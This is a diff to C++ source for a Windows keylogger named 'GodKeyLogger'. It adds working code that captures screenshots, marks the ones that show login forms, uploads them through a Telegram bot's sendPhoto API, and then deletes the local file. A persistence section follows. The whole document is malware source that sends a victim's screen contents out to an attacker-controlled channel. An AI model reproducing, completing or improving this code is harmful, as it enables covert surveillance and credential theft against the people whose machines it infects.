@@ -412,22 +412,18 @@ bool TakeSmartScreenshot() {
     
     CloseHandle(file);
     
-    // 🔥 ENHANCED: Better notification
+    // 🔥 FIXED: Now actually upload the image to Telegram
     wchar_t window_title[256] = {0};
     GetWindowTextW(fg, window_title, 256);
     
-    std::wstring msg = L"✅ SCREENSHOT CAPTURED!\n";
-    msg += L"📁 File: " + std::wstring(path) + L"\n";
-    msg += L"🖼️ Size: " + std::to_wstring(width) + L"x" + std::to_wstring(height) + L"\n";
-    msg += L"🪟 Window: " + std::wstring(window_title) + L"\n";
-    
+    std::wstring caption = L"🖼️ Screenshot: ";
+    caption += window_title;
     if (in_login_form) {
-        msg += L"🔑 Type: Login Form\n";
-    } else {
-        msg += L"📋 Type: Regular Screen\n";
+        caption += L" (Login Form)";
     }
     
-    SendTelegram(msg.c_str());
+    // Actually upload the image
+    SendTelegramPhoto(path, caption.c_str());
     
     // Cleanup
     SelectObject(mem_dc, old_bitmap);
@@ -435,11 +431,123 @@ bool TakeSmartScreenshot() {
     DeleteDC(mem_dc);
     ReleaseDC(NULL, screen_dc);
     
-    // Optional: Delete temp file after sending
-    // DeleteFileW(path);
+    // Delete temp file after sending (optional)
+    DeleteFileW(path);
     
     screenshot_count++;
     return true;
+}
+
+// 🔥 WORKING TELEGRAM PHOTO UPLOAD FUNCTION
+void SendTelegramPhoto(const wchar_t* file_path, const wchar_t* caption) {
+    SendTelegram(L"📸 Uploading screenshot to Telegram...");
+    
+    // Open the BMP file
+    HANDLE hFile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        SendTelegram(L"❌ Cannot open screenshot file");
+        return;
+    }
+    
+    // Get file size
+    DWORD file_size = GetFileSize(hFile, NULL);
+    if (file_size == INVALID_FILE_SIZE || file_size == 0) {
+        CloseHandle(hFile);
+        SendTelegram(L"❌ Screenshot file is empty or invalid");
+        return;
+    }
+    
+    // Read file content
+    BYTE* file_data = new BYTE[file_size];
+    DWORD bytes_read;
+    if (!ReadFile(hFile, file_data, file_size, &bytes_read, NULL)) {
+        delete[] file_data;
+        CloseHandle(hFile);
+        SendTelegram(L"❌ Cannot read screenshot file");
+        return;
+    }
+    CloseHandle(hFile);
+    
+    // Telegram API requires multipart form data
+    std::string boundary = "----GodKeyLoggerBoundary";
+    
+    // Convert caption to UTF-8
+    std::wstring caption_w = caption;
+    std::string caption_utf8(caption_w.begin(), caption_w.end());
+    
+    // Build the multipart form data
+    std::string form_data;
+    
+    // Add chat_id
+    form_data += "--" + boundary + "\r\n";
+    form_data += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
+    std::wstring chat_id_w = CHAT_ID;
+    form_data += std::string(chat_id_w.begin(), chat_id_w.end()) + "\r\n";
+    
+    // Add caption
+    form_data += "--" + boundary + "\r\n";
+    form_data += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
+    form_data += caption_utf8 + "\r\n";
+    
+    // Add photo
+    form_data += "--" + boundary + "\r\n";
+    form_data += "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.bmp\"\r\n";
+    form_data += "Content-Type: image/bmp\r\n\r\n";
+    
+    // Add binary data
+    std::string binary_part(reinterpret_cast<char*>(file_data), file_size);
+    form_data += binary_part + "\r\n";
+    form_data += "--" + boundary + "--\r\n";
+    
+    delete[] file_data;
+    
+    // Send to Telegram
+    HINTERNET hSession = WinHttpOpen(L"GodKeyLogger/3.0", 
+                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                     WINHTTP_NO_PROXY_NAME, 
+                                     WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        SendTelegram(L"❌ Cannot initialize WinHTTP");
+        return;
+    }
+    
+    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", 
+                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        SendTelegram(L"❌ Cannot connect to Telegram");
+        return;
+    }
+    
+    std::wstring bot_url = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto";
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", bot_url.c_str(),
+                                            NULL, WINHTTP_NO_REFERER,
+                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                            WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        SendTelegram(L"❌ Cannot create HTTP request");
+        return;
+    }
+    
+    // Set content type
+    std::string content_type = "multipart/form-data; boundary=" + boundary;
+    std::wstring content_type_w(content_type.begin(), content_type.end());
+    
+    if (WinHttpSendRequest(hRequest,
+                          content_type_w.c_str(), -1,
+                          (LPVOID)form_data.c_str(), form_data.size(),
+                          form_data.size(), 0)) {
+        WinHttpReceiveResponse(hRequest, NULL);
+        SendTelegram(L"✅ Screenshot uploaded to Telegram!");
+    } else {
+        SendTelegram(L"❌ Failed to upload screenshot");
+    }
+    
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
 }
 
 // 🔥 ENHANCED TELEGRAM FUNCTION WITH COOL FORMATTING
@@ -518,13 +626,6 @@ void SendTelegram(const wchar_t* msg) {
         
         if (attempt < 2) Sleep(2000); // Wait before retry
     }
-}
-
-void SendTelegramPhoto(const wchar_t* file_path, const wchar_t* caption) {
-    std::wstring msg = L"📸 Screenshot captured!\n";
-    msg += L"📁 File: " + std::wstring(file_path) + L"\n";
-    msg += L"📝 Caption: " + std::wstring(caption);
-    SendTelegram(msg.c_str());
 }
 
 // 🔥 PERSISTENCE
